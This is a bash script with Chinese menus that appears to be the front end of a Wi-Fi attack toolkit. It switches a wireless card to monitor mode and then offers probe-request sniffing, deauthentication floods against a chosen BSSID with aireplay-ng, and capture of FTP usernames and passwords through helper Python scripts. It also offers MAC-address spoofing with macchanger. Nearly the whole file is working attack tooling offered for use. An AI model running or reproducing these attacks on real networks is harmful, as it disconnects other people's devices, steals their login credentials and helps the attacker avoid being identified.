#!/bin/bash

pyName="python3" #use python3

function setcard() {
	#mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	mon=$(sudo airmon-ng start ${interface} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
	echo -e "\n [*] 可使用 'sudo airmon-ng stop ${mon}' 来暂停 airmon-ng."
	
	#Use mon
	if [ $option == ftp ]; then
         #use python code
         echo ""
		 sudo $pyName code/ftpSniff.py -i $mon
	elif [ $probeM == all ]; then
		 #use python code
		 echo ""
		 sudo $pyName code/SniffProbe.py -i $mon
	elif [ $probeM == hidden ]; then
		 #use python code
		 echo ""
		 sudo $pyName code/SniffHidden.py -i $mon	  
	elif [ $option == frame ]; then
		 read -p ' [!] 发送断开连接包? [Y/N] ' fsend
		 if [ $fsend == "Y" -o $fsend == "y"  ]; then
		 	  read -p ' [?] 输入对象的 BSSID:: ' tb
		  	  sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $mon
		 else
		  	  exit 0	
		 fi		
	fi	 
}

echo "-------------------------------------------\
----------------------------------"
echo "[+] 列出无线网卡:"
echo ""
sudo iwconfig
read -p "[&] 请选择无线网卡 : " interface
check=$(sudo iwconfig $interface)
#echo $check

if [ ! -n "$check" ]; then

	echo "[-] 此接口没有无线功能"

else
    mcheck=$(sudo iwconfig $interface|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
    probeM="none"
	option="none"
	while :
	do
		 echo "-------------------------------------------\
----------------------------------"
		 echo -e "\n 选项:"
		 echo " [1] Probe嗅探"
		 echo " [2] WiFi帧攻击"
		 echo " [3] 嗅探FTP账户和密码"
		 echo -e "\033[31m [9] 返回 \033[0m"
		 echo ""
		 read -p ' [&] 选择要执行的功能: ' o1
		 if [ $o1 == 1 ]; then
			 while :
			 do
		 	 		echo "-------------------------------------------\
----------------------------------"
		 	     	echo ""
					echo " [1] 显示全部Probe"
     		 		echo " [2] 只显示隐藏SSID的Probe"
			 		echo -e "\033[31m [9] 返回 \033[0m"
			 		echo ""
			 		read -p ' [&] 选择要执行的功能: ' o2
					echo "-------------------------------------------\
----------------------------------"
			 		if [ $o2 == 1 ]; then
				 		probeM="all"
						 break 2
			 		elif [ $o2 == 2 ]; then
				 		probeM="hidden"
						 break 2
			 		elif [ $o2 == 9 ]; then
				 		continue 2
					else
			    		 echo -e "\n[-] 未知选项: $o2"
		     		fi
		 	 done
		 elif [ $o1 == 2 ]; then
				 option="frame"
				 break
		 elif [ $o1 == 3 ]; then
				 option="ftp"
				 break
		 elif [ $o1 == 9 ]; then
				 exit 0
		 else
			     echo -e "\n[-] 未知选项: $o1"
		 fi
	done
    
    if [ $option == ftp ]; then
		 echo " [=] 选项: FTP "
	elif [ $probeM="all" -o $probeM="hidden" ]; then
		 echo " [=] 选项: Probe "
	elif [ $option == frame ]; then
		 echo " [=] 选项: Beacon Frame "
    fi

    read -p ' [!] 是否更换MAC地址? [Y/N] ' key
   
    if [ $key == "Y" -o $key == "y"  ]; then
        sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        echo -e " [*] 可使用 (Need stop the airmon-ng.)\n'sudo ifconfig ${interface} down && sudo macchanger -p \
${interface} && sudo ifconfig ${interface} up'\n[*] 恢复原来的MAC地址(需要终止 airmon-ng.)"
    else
        echo -e "\n[-] 不改变MAC地址"
		echo "-------------------------------------------\
----------------------------------"
	fi

	if [ "${mcheck}" == "Monitor" ]; then
		read -p " [!] 是否跳过网卡设置? [Y/N]" skipset
        if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	if [ $option == ftp ]; then
                 #use python code
                 echo ""
				 echo "-------------------------------------------\
----------------------------------"
				 sudo $pyName code/ftpSniff.py -i $interface
            elif [ $probeM == all ]; then
				  #use python code
                  echo ""
				  echo "-------------------------------------------\
----------------------------------"
				  sudo $pyName code/SniffProbe.py -i $interface
			elif [ $probeM == hidden ]; then
				  #use python code
                  echo ""
				  echo "-------------------------------------------\
----------------------------------"
				  sudo $pyName code/SniffHidden.py -i $interface
			elif [ $option == frame ]; then
				  read -p ' [!] 发送断开连接包? [Y/N] ' fsend
				  if [ $fsend == "Y" -o $fsend == "y"  ]; then
				  	    read -p ' [?] 输入对象的 BSSID: ' tb
		  		        sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface
				  else
				       exit 1	
				  fi	  
            fi
		else
			 echo -e "\n [-] 正在将网卡切换到监听模式"
			 sudo airmon-ng stop ${interface}
			 interface=$( sudo airmon-ng stop ${interface} | grep "mac80211 station" | cut -d "]" -f2 | cut -d ")" -f1)
			 setcard
		fi
    else 
		 setcard
    fi

fi
